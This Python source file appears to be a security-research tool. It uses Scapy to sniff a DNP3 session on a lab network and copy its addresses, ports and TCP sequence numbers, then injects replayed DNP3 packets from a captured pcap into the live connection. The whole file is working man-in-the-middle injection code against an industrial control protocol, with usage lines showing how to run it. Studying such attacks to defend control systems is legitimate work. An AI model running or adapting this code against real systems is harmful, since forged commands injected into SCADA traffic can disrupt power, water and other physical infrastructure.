__author__ = 'Nicholas Rodofile'
from Injection import *
from scapy.all import IP, TCP


'''
Usage:
injector = InjectionReplay("mitm/replay_20160225_1634.pcap")
sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=1200)
'''


class InjectionReplay(Inject):
    def __init__(self, pcap):
        Inject.__init__(self)
        self.pcap = rdpcap(pcap)
        self.pcap_count = 0

    def inject_packet(self):
        if self.pcap_count < len(self.pcap):
            p = self.pcap[self.pcap_count]
            #self.tcp.seq = self.tcp.seq + len(p[DNP3])
            self.tcp_ip = self.ether/self.ip/self.tcp
            dnp3 = self.tcp_ip/p[DNP3]
            self.sendp(dnp3)

    def update_injection(self, p):
        self.ether.src = p[Ether].src
        self.ether.dst = p[Ether].dst
        self.ip.src = p[IP].src
        self.ip.dst = p[IP].dst
        self.tcp.sport = p[TCP].sport
        self.tcp.dport = p[TCP].dport
        self.tcp.seq = p[TCP].seq + len(p[DNP3])
        self.tcp.ack = p[TCP].ack
        #self.count += 1
        #if self.count == 2:
        #    self.inject_packet()

    def process_pkt(self, p):
        if p.haslayer(DNP3ApplicationResponse):
            self.update_injection(p)



#   injector = InjectionReplay("mitm/replay_20160225_1634.pcap")
#   sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=1200)